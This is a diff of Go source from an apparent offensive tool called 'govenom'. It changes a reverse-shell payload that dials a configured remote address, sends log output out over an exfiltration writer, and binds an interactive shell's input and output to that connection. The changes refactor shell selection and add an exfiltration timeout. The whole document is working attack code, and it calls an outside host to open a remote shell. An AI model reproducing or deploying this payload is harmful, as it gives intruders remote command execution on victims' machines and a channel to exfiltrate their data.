@@ -6,6 +6,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"time"
 
 	"govenom/exfilwriter"
 )
@@ -15,25 +16,35 @@ var (
 	address      string
 	network      string
 	exfilCfg     string
-	noWindowsGui string
+	exfilTimeout string
+	noWindowsGui string // nolint:varcheck,go-lint
 	shell        string
 )
 
-func determineShellBinary(candidates []string) (string, error) {
-	candidates = append([]string{shell}, candidates...)
+func determineShellCommand(prioritizedChoices [][]string) (shell string, args []string, err error) {
+	candidates, err := buildShellCommandList(prioritizedChoices...)
+	if err != nil {
+		return "", nil, fmt.Errorf("getting shell command suggestions: %v", err)
+	}
+
 	for _, candidate := range candidates {
-		binary, err := exec.LookPath(candidate)
+		if len(candidate) == 0 {
+			continue
+		}
+
+		_, err := exec.LookPath(candidate[0])
 		if err != nil {
 			continue
 		}
-		return binary, nil
+
+		return candidate[0], candidate[1:], nil
 	}
-	return "", fmt.Errorf("could not find any existing shell binary")
+
+	return "", nil, fmt.Errorf("could not find any existing shell binary")
 }
 
-func attachShell(binaryPath string, con net.Conn) error {
-	var cmd *exec.Cmd
-	cmd = exec.Command(binaryPath, "-i")
+func attachShell(con net.Conn, shellBinary string, args ...string) error {
+	cmd := exec.Command(shellBinary, args...)
 	cmd.SysProcAttr = getSysProcAttr()
 	cmd.Stdin = con
 	cmd.Stdout = con
@@ -41,28 +52,43 @@ func attachShell(binaryPath string, con net.Conn) error {
 
 	err := cmd.Start()
 	if err != nil {
-		return fmt.Errorf("could not start shell: %v", err)
+		return fmt.Errorf("execute shell: %v", err)
 	}
+
 	err = cmd.Wait()
 	if err != nil {
 		return fmt.Errorf("shell died: %v", err)
 	}
+
 	return nil
 }
 
 func main() {
-	w, errs := exfilwriter.New(exfilCfg)
+	timeout := 3 * time.Second
+	if exfilTimeout != "" {
+		dt, err := time.ParseDuration(exfilTimeout)
+		if err == nil {
+			timeout = dt
+		}
+	}
+
+	w, errs := exfilwriter.New(exfilCfg, timeout)
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "unknown"
 	}
+
 	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)
 
 	conn, err := net.Dial(network, address)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal(err.Error())
 	}
+
+	defer conn.Close()
+
 	w.AddExfiltrator(conn)
+
 	// send out debuglog configuration errors *at least* over TCP
 	if len(errs) > 0 {
 		for _, err := range errs {
@@ -70,16 +96,17 @@ func main() {
 		}
 	}
 
-	binaryPath, err := determineShellBinary(getShellBinaries())
+	shellBinary, args, err := determineShellCommand([][]string{{shell}})
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	log.Printf("Using Shell: %s\n", binaryPath)
+	log.Printf("Using Shell: %s\n", shellBinary)
 
-	err = attachShell(binaryPath, conn)
+	err = attachShell(conn, shellBinary, args...)
 	if err != nil {
 		log.Fatal(err)
 	}
+
 	log.Println("Shell terminated")
 }
